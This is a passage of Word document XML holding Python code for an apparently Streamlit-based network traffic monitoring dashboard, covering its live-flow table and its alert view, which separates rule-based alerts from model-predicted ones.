          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        rows.append(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10FBEBA5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B971E9F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "时间": pd.to_datetime(f["last_seen"], unit="s").strftime("%H:%M:%S"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C3F8A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "探针": f["probe_id"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21C73F65">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "协议": PROTO_NAME.get(proto, proto),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E16E518">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "源": f"{src_ip}:{src_port}",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F3A6772">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "目的": f"{dst_ip}:{dst_port}",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65B95C59">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "时长(s)": round(dur / 1e6, 3) if isinstance(dur, (int, float)) else None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EF180CA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "前向包": f["summary"].get("Total Fwd Packets"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E0A7E8E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "后向包": f["summary"].get("Total Backward Packets"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26F6226F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "判定": f["predicted"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A94AAF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "置信度": f"{f['confidence']:.3f}",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F81D95C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="172BD1AA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA50A72">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    st.dataframe(pd.DataFrame(rows), width="stretch", height=320, hide_index=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="410E2E03">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E2559F4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="479C1528">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>with tab_live:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EC113FC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if live:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10412D82">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.fragment(run_every=2.0)(draw_live)()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E5B8FFC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C194AAF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.button("刷新", key="refresh_live")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08F278A8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        draw_live()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="038C47CE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5AE95A13">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42DFC6B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ------------------------------------------------------------------ 告警</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A41DDB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50C11F15">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08D3135D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def draw_alerts() -&gt; None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4699EAE9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    data, err = api("/api/v1/alerts", limit=200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62413262">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if err:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51B71343">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.error(err)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60A2479E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D5481DA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    alerts = data.get("alerts", [])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D1EB1D4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not alerts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="238C4026">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.info("窗口内没有告警。")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D1E715">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33F1F3D6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50D917BC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    df = pd.DataFrame(alerts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C372A13">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    df["风险"] = df["risk"].map(lambda r: RISK_TEXT.get(r, r))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D180D83">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    df["时间"] = pd.to_datetime(df["created_at"], unit="s").dt.strftime("%m-%d %H:%M:%S")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6778BD1F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # source='rule' 的行，confidence 那列是"超出阈值多少倍"，不是概率，不能按百分比展示</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="008E879E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    src = df["source"].fillna("model") if "source" in df.columns else pd.Series(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06ECD6CD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "model", index=df.index)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3575781A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    df["来源"] = src.map(lambda s: "规则" if s == "rule" else "小模型")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C45FD10">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    df["判定值"] = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0656270D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        f"{float(c):.2f}×" if s == "rule" else f"{float(c):.1%}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F06D872">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for c, s in zip(df["confidence"], src)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21706981">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14BDBB80">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    show = df[["id", "时间", "probe_id", "category", "来源", "判定值", "风险", "flow_key"]].rename(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64BB5631">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        columns={"id": "编号", "probe_id": "探针", "category": "类别",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF2F81E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                 "flow_key": "流标识"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64B0F9BE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56F61A8C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AFC11D7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    c1, c2 = st.columns([2, 3])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BDEBC21">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    with c1:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05FDABE8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        cats = ["全部"] + sorted(df["category"].unique())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EC354B2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        pick = st.selectbox("按类别过滤", cats)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71CC81FC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        view = show if pick == "全部" else show[df["category"] == pick]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D7C6C1E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
